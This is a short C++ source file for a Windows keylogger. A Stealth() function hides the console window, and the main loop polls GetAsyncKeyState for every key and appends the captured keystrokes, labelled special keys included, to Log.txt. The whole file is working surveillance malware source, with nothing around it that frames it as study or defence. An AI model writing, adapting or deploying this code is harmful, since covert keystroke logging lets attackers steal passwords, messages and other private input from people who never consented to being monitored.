#include <iostream>
#include <windows.h>
#include <winuser.h>
#include "Keylogger.h"

using namespace std;

int main()
{
    Stealth();
    char i;

    while(true)
    {
        for(i=0; i<=190; i++)
        {
            if(GetAsyncKeyState(i) == -32767)
                Save(i, "Log.txt");
        }
    }
    system("PAUSE");
    return 0;
}

int Save(int keyStroke, char *file)
{
    if(keyStroke == 1 || keyStroke == 2)
        return 0;

    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");

    cout << keyStroke << endl;

    if(keyStroke == 8)
        fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
    else if(keyStroke == 13)
        fprintf(OUTPUT_FILE, "%s", "\n");
    else if(keyStroke == 32)
        fprintf(OUTPUT_FILE, "%s", " ");
    else if(keyStroke == VK_TAB)
        fprintf(OUTPUT_FILE, "%s", "[TAB]");
    else if(keyStroke == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    else if(keyStroke == VK_CONTROL)
        fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
    else if(keyStroke == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
    else if(keyStroke == VK_END)
        fprintf(OUTPUT_FILE, "%s", "[END]");
    else if(keyStroke == VK_HOME)
        fprintf(OUTPUT_FILE, "%s", "[HOME]");
    else if(keyStroke == VK_LEFT)
        fprintf(OUTPUT_FILE, "%s", "[LEFT]");
    else if(keyStroke == VK_UP)
        fprintf(OUTPUT_FILE, "%s", "[UP]");
    else if(keyStroke == VK_RIGHT)
        fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
    else if(keyStroke == VK_DOWN)
        fprintf(OUTPUT_FILE, "%s", "[DOWN]");
    else if(keyStroke == 190 || keyStroke == 110)
        fprintf(OUTPUT_FILE, "%s", ".");
    else
        fprintf(OUTPUT_FILE, "%s", &keyStroke);

    fclose(OUTPUT_FILE);

    return 0;
}

void Stealth()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth,0);
}






